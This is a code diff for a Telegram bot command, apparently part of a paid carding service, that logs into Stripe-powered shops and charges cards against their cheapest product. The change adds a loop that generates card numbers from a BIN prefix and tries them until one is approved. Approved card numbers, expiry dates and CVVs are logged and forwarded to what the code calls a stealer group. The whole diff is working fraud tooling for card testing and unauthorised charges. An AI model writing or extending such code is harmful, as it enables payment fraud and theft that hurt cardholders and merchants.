@@ -9142,148 +9142,336 @@ async def gate_str(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 @require_premium
 async def gate_wah(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Website Auto-Hit: login to a Stripe-powered site, find cheapest product, charge card."""
-    import time as time_module
+    """Website Auto-Hit: single card OR unlimited BIN loop against a Stripe-powered site."""
     import asyncio as _asyncio
     user = update.effective_user
     username = user.username or user.first_name
+    user_id = user.id
 
-    # Parse input: /wah url|email|password|cc|mm|yy|cvv
+    # ── Parse input ───────────────────────────────────────────────────────────
+    # Formats:
+    #   Single card:  /wah url|email|password|cc|mm|yy|cvv
+    #   BIN loop:     /wah url|email|password|bin[|mm|yy|cvv]
     raw = update.message.text.split(maxsplit=1)
     if len(raw) < 2:
         await update.message.reply_text(
-            "❌ <b>Invalid Format!</b>\n\n"
-            "🎯 <b>Usage:</b>\n"
-            "<code>/wah url|email|password|cc|mm|yy|cvv</code>\n\n"
-            "💡 <b>Example:</b>\n"
-            "<code>/wah example.com|user@mail.com|pass123|4242424242424242|12|25|123</code>",
+            ae("❌ <b>Invalid Format!</b>\n\n"
+               "🎯 <b>Usage:</b>\n"
+               "▸ Single card:\n"
+               "  <code>/wah url|email|pass|cc|mm|yy|cvv</code>\n\n"
+               "▸ BIN loop (hits until approved):\n"
+               "  <code>/wah url|email|pass|bin</code>\n"
+               "  <code>/wah url|email|pass|bin|mm|yy|cvv</code>\n\n"
+               "💡 Use /stop to stop the BIN loop."),
             parse_mode=ParseMode.HTML,
         )
         return
 
-    parts = raw[1].strip().split("|")
-    if len(parts) < 7:
+    parts = [p.strip() for p in raw[1].strip().split("|")]
+    if len(parts) < 4:
         await update.message.reply_text(
-            "❌ <b>Need 7 fields:</b> url|email|password|cc|mm|yy|cvv",
+            "❌ <b>Need at least 4 fields:</b> url|email|password|cc_or_bin",
             parse_mode=ParseMode.HTML,
         )
         return
 
-    site_url, email, password = parts[0].strip(), parts[1].strip(), parts[2].strip()
-    cc, mm, yy, cvv = parts[3].strip(), parts[4].strip(), parts[5].strip(), parts[6].strip()
+    site_url  = parts[0]
+    email     = parts[1]
+    password  = parts[2]
+    card_part = parts[3]          # cc number OR BIN prefix
+    mm_part   = parts[4] if len(parts) > 4 else "xx"
+    yy_part   = parts[5] if len(parts) > 5 else "xx"
+    cvv_part  = parts[6] if len(parts) > 6 else "xxx"
 
-    if not cc.isdigit() or len(cc) < 15:
-        await update.message.reply_text("❌ <b>Invalid card number.</b>", parse_mode=ParseMode.HTML)
+    # Detect BIN mode: numeric, 6–12 digits (not a full card number)
+    card_digits = re.sub(r"\D", "", card_part)
+    is_bin_mode = card_digits.isdigit() and 6 <= len(card_digits) <= 12
+
+    from modules.gate_checker import get_bin_info
+    from modules.stripe_web_auto import run_wah, setup_wah_session, charge_wah_card
+
+    # ── Helper: format + send a result reply ─────────────────────────────────
+    async def _send_result(cc, mm, yy, cvv, result, product_title, product_price):
+        status   = result.get("status", "error")
+        message  = result.get("message", "Unknown")
+        stripe_pk = result.get("stripe_pk") or "N/A"
+        elapsed   = result.get("elapsed", 0)
+        price_str = f"${product_price:.2f}" if product_price else "N/A"
+        bin_info  = get_bin_info(cc)
+        bin_scheme = bin_info.get("scheme", "N/A").upper()
+        bin_type   = bin_info.get("type", "").upper()
+        bin_bank   = (bin_info.get("bank", {}).get("name", "N/A")
+                      if isinstance(bin_info.get("bank"), dict)
+                      else bin_info.get("bank", "N/A"))
+        bin_country = (bin_info.get("country", {}).get("name", "N/A")
+                       if isinstance(bin_info.get("country"), dict)
+                       else bin_info.get("country", "N/A"))
+        masked_pk = (stripe_pk[:14] + "…" + stripe_pk[-4:]) if len(stripe_pk) > 20 else stripe_pk
+
+        if status == "approved":
+            log_approved_card(user_id, username, cc, mm, yy, cvv, "wah", message, bin_info)
+            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "wah", message, bin_info, user_id, username)
+            text = ae(
+                f"✅ <b>APPROVED — WAH Gate</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
+                f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
+                f"🛒 <b>Product:</b> {product_title} ({price_str})\n"
+                f"🔑 <b>PK:</b> <code>{masked_pk}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"✅ <b>Result:</b> {message}\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"🏦 <b>Bank:</b> {bin_bank}\n"
+                f"🌍 <b>Country:</b> {bin_country}\n"
+                f"💠 <b>Type:</b> {bin_scheme} {bin_type}\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"⏱ <b>Time:</b> {elapsed}s | 👤 {username}"
+            )
+            gif_url = get_sexy_anime_gif("success")
+            await update.message.reply_animation(animation=gif_url, caption=text, parse_mode=ParseMode.HTML)
+        elif status == "declined":
+            text = ae(
+                f"❌ <b>DECLINED — WAH Gate</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
+                f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
+                f"🛒 <b>Product:</b> {product_title} ({price_str})\n"
+                f"🔑 <b>PK:</b> <code>{masked_pk}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"❌ <b>Result:</b> {message}\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"🏦 <b>Bank:</b> {bin_bank}\n"
+                f"🌍 <b>Country:</b> {bin_country}\n"
+                f"💠 <b>Type:</b> {bin_scheme} {bin_type}\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"⏱ <b>Time:</b> {elapsed}s | 👤 {username}"
+            )
+            gif_url = get_sexy_anime_gif("failed")
+            await update.message.reply_animation(animation=gif_url, caption=text, parse_mode=ParseMode.HTML)
+        else:
+            text = ae(
+                f"⚠️ <b>ERROR — WAH Gate</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
+                f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"⚠️ <b>Result:</b> {message}\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"⏱ <b>Time:</b> {elapsed}s | 👤 {username}"
+            )
+            gif_url = get_sexy_anime_gif("failed")
+            await update.message.reply_animation(animation=gif_url, caption=text, parse_mode=ParseMode.HTML)
+
+    loop = _asyncio.get_event_loop()
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # MODE A — Single card
+    # ══════════════════════════════════════════════════════════════════════════
+    if not is_bin_mode:
+        cc, mm, yy, cvv = card_digits, mm_part, yy_part, cvv_part
+        if not cc.isdigit() or len(cc) < 15:
+            await update.message.reply_text("❌ <b>Invalid card number.</b>", parse_mode=ParseMode.HTML)
+            return
+
+        status_msg = await update.message.reply_text(
+            ae(f"⌛️ <b>Website Auto-Hit in progress…</b>\n\n"
+               f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
+               f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n\n"
+               f"Logging in and finding cheapest product…"),
+            parse_mode=ParseMode.HTML,
+        )
+        try:
+            result = await loop.run_in_executor(
+                None, run_wah, site_url, email, password, cc, mm, yy, cvv
+            )
+        except Exception as e:
+            try:
+                await status_msg.delete()
+            except Exception:
+                pass
+            await update.message.reply_text(
+                ae(f"⚠️ <b>WAH Error</b>\n\n<code>{str(e)[:100]}</code>"),
+                parse_mode=ParseMode.HTML,
+            )
+            return
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+        product_title = result.get("product_title") or "N/A"
+        product_price = result.get("product_price")
+        await _send_result(cc, mm, yy, cvv, result, product_title, product_price)
         return
 
-    checking_msg = await update.message.reply_text(
-        ae(f"⌛️ <b>Website Auto-Hit in progress…</b>\n\n"
+    # ══════════════════════════════════════════════════════════════════════════
+    # MODE B — BIN loop: generate cards indefinitely until approved or /stop
+    # ══════════════════════════════════════════════════════════════════════════
+    if context.user_data.get(f'mass_check_running_{user_id}'):
+        await update.message.reply_text(
+            ae("⏳ <b>Already Running</b>\n\nA WAH loop is already active. Use /stop to cancel."),
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    bin_prefix = card_digits
+    bin_display = f"{bin_prefix}{'x' * (16 - len(bin_prefix))}"
+
+    status_msg = await update.message.reply_text(
+        ae(f"⌛️ <b>WAH BIN Loop Starting…</b>\n\n"
            f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
-           f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n\n"
-           f"Logging in and finding cheapest product…"),
+           f"💳 <b>BIN:</b> <code>{bin_display}</code>\n\n"
+           f"Logging in and finding cheapest product…\n"
+           f"Use /stop to cancel."),
         parse_mode=ParseMode.HTML,
     )
 
-    loop = _asyncio.get_event_loop()
+    # Phase 1: setup (login + find product) — blocking, run in executor
     try:
-        from modules.stripe_web_auto import run_wah
-        result = await loop.run_in_executor(
-            None, run_wah, site_url, email, password, cc, mm, yy, cvv
+        setup = await loop.run_in_executor(
+            None, setup_wah_session, site_url, email, password
         )
     except Exception as e:
         try:
-            await checking_msg.delete()
+            await status_msg.delete()
         except Exception:
             pass
         await update.message.reply_text(
-            ae(f"⚠️ <b>WAH Error</b>\n\n<code>{str(e)[:100]}</code>"),
+            ae(f"⚠️ <b>WAH Setup Error</b>\n\n<code>{str(e)[:100]}</code>"),
             parse_mode=ParseMode.HTML,
         )
         return
 
-    status = result.get("status", "error")
-    message = result.get("message", "Unknown error")
-    product_title = result.get("product_title") or "N/A"
-    product_price = result.get("product_price")
-    stripe_pk = result.get("stripe_pk") or "N/A"
-    elapsed = result.get("elapsed", 0)
+    if not setup.get("ok"):
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+        await update.message.reply_text(
+            ae(f"⚠️ <b>WAH Setup Failed</b>\n\n{setup.get('error', 'Unknown error')}"),
+            parse_mode=ParseMode.HTML,
+        )
+        return
 
+    wah_session  = setup["session"]
+    wah_product  = setup["product"]
+    wah_site_url = setup["site_url"]
+    product_title = wah_product.get("title", "N/A")
+    product_price = wah_product.get("price")
     price_str = f"${product_price:.2f}" if product_price else "N/A"
 
-    from modules.gate_checker import get_bin_info
-    bin_info = get_bin_info(cc)
-    bin_scheme = bin_info.get("scheme", "N/A").upper()
-    bin_type = bin_info.get("type", "").upper()
-    bin_bank = bin_info.get("bank", {}).get("name", "N/A") if isinstance(bin_info.get("bank"), dict) else bin_info.get("bank", "N/A")
-    bin_country = bin_info.get("country", {}).get("name", "N/A") if isinstance(bin_info.get("country"), dict) else bin_info.get("country", "N/A")
+    # Phase 2: BIN loop
+    context.user_data[f'mass_check_running_{user_id}'] = True
+    context.user_data['mass_check_stop'] = False
 
-    masked_pk = (stripe_pk[:14] + "…" + stripe_pk[-4:]) if len(stripe_pk) > 20 else stripe_pk
+    checked  = 0
+    approved = 0
+    declined = 0
+    errors   = 0
+    last_card = ""
 
-    if status == "approved":
-        log_approved_card(user.id, username, cc, mm, yy, cvv, "wah", message, bin_info)
-        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "wah", message, bin_info, user.id, username)
-        response_text = ae(
-            f"✅ <b>APPROVED — WAH Gate</b>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
-            f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
-            f"🛒 <b>Product:</b> {product_title} ({price_str})\n"
-            f"🔑 <b>PK:</b> <code>{masked_pk}</code>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"✅ <b>Result:</b> {message}\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"🏦 <b>Bank:</b> {bin_bank}\n"
-            f"🌍 <b>Country:</b> {bin_country}\n"
-            f"💠 <b>Type:</b> {bin_scheme} {bin_type}\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"⏱ <b>Time:</b> {elapsed}s | 👤 {username}"
+    try:
+        await status_msg.edit_text(
+            ae(f"⌛️ <b>WAH BIN Loop Running</b>\n\n"
+               f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
+               f"🛒 <b>Product:</b> {product_title} ({price_str})\n"
+               f"💳 <b>BIN:</b> <code>{bin_display}</code>\n\n"
+               f"⏳ Checked: 0 | ✅ Approved: 0 | ❌ Declined: 0\n\n"
+               f"Use /stop to cancel."),
+            parse_mode=ParseMode.HTML,
         )
-        try:
-            await checking_msg.delete()
-        except Exception:
-            pass
-        gif_url = get_sexy_anime_gif("success")
-        await update.message.reply_animation(animation=gif_url, caption=response_text, parse_mode=ParseMode.HTML)
-    elif status == "declined":
-        response_text = ae(
-            f"❌ <b>DECLINED — WAH Gate</b>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
-            f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
-            f"🛒 <b>Product:</b> {product_title} ({price_str})\n"
-            f"🔑 <b>PK:</b> <code>{masked_pk}</code>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"❌ <b>Result:</b> {message}\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"🏦 <b>Bank:</b> {bin_bank}\n"
-            f"🌍 <b>Country:</b> {bin_country}\n"
-            f"💠 <b>Type:</b> {bin_scheme} {bin_type}\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"⏱ <b>Time:</b> {elapsed}s | 👤 {username}"
-        )
-        try:
-            await checking_msg.delete()
-        except Exception:
-            pass
-        gif_url = get_sexy_anime_gif("failed")
-        await update.message.reply_animation(animation=gif_url, caption=response_text, parse_mode=ParseMode.HTML)
-    else:
-        response_text = ae(
-            f"⚠️ <b>ERROR — WAH Gate</b>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"💳 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
-            f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"⚠️ <b>Result:</b> {message}\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"⏱ <b>Time:</b> {elapsed}s | 👤 {username}"
-        )
-        try:
-            await checking_msg.delete()
-        except Exception:
-            pass
-        gif_url = get_sexy_anime_gif("failed")
-        await update.message.reply_animation(animation=gif_url, caption=response_text, parse_mode=ParseMode.HTML)
+    except Exception:
+        pass
+
+    BATCH = 10
+
+    try:
+        while True:
+            if context.user_data.get('mass_check_stop'):
+                break
+
+            # Generate a fresh batch of cards from BIN
+            gen_result = parse_gen_input(f"{bin_prefix}|{mm_part}|{yy_part}|{cvv_part}")
+            if not gen_result:
+                break
+            prefix_g, mm_g, yy_g, cvv_g = gen_result
+            card_lines = generate_cards_from_bin(prefix_g, mm_g, yy_g, cvv_g, BATCH)
+            parsed_cards = auto_hitter_parse_cards("\n".join(card_lines))
+
+            for card_obj in parsed_cards:
+                if context.user_data.get('mass_check_stop'):
+                    break
+
+                cc  = card_obj.get("cc", "")
+                mm  = card_obj.get("month", "")
+                yy  = card_obj.get("year", "")
+                cvv = card_obj.get("cvv", "")
+                last_card = f"{cc}|{mm}|{yy}|{cvv}"
+
+                # Charge in executor
+                try:
+                    result = await loop.run_in_executor(
+                        None, charge_wah_card,
+                        wah_session, wah_site_url, wah_product,
+                        cc, mm, yy, cvv
+                    )
+                except Exception as e:
+                    errors += 1
+                    checked += 1
+                    result = {"status": "error", "message": str(e)[:60], "stripe_pk": None, "elapsed": 0}
+
+                checked += 1
+                st = result.get("status", "error")
+                if st == "approved":
+                    approved += 1
+                elif st == "declined":
+                    declined += 1
+                else:
+                    errors += 1
+
+                # Update progress every card
+                try:
+                    await status_msg.edit_text(
+                        ae(f"⌛️ <b>WAH BIN Loop Running</b>\n\n"
+                           f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
+                           f"🛒 <b>Product:</b> {product_title} ({price_str})\n"
+                           f"💳 <b>BIN:</b> <code>{bin_display}</code>\n"
+                           f"🔍 <b>Last:</b> <code>{last_card}</code>\n\n"
+                           f"⏳ Checked: {checked} | ✅ {approved} | ❌ {declined} | ⚠️ {errors}\n\n"
+                           f"Use /stop to cancel."),
+                        parse_mode=ParseMode.HTML,
+                    )
+                except Exception:
+                    pass
+
+                if st == "approved":
+                    # Report the approved card and stop
+                    try:
+                        await status_msg.delete()
+                    except Exception:
+                        pass
+                    await _send_result(cc, mm, yy, cvv, result, product_title, product_price)
+                    return
+
+                await _asyncio.sleep(1)
+
+    finally:
+        context.user_data[f'mass_check_running_{user_id}'] = False
+        context.user_data['mass_check_stop'] = False
+
+    # Stopped without approval
+    try:
+        await status_msg.delete()
+    except Exception:
+        pass
+    await update.message.reply_text(
+        ae(f"🛑 <b>WAH BIN Loop Stopped</b>\n\n"
+           f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
+           f"💳 <b>BIN:</b> <code>{bin_display}</code>\n\n"
+           f"⏳ Checked: {checked} | ✅ {approved} | ❌ {declined} | ⚠️ {errors}\n"
+           f"🔍 Last: <code>{last_card}</code>\n\n"
+           f"👤 {username}"),
+        parse_mode=ParseMode.HTML,
+    )
 
 @require_premium
 async def mass_str(update: Update, context: ContextTypes.DEFAULT_TYPE):
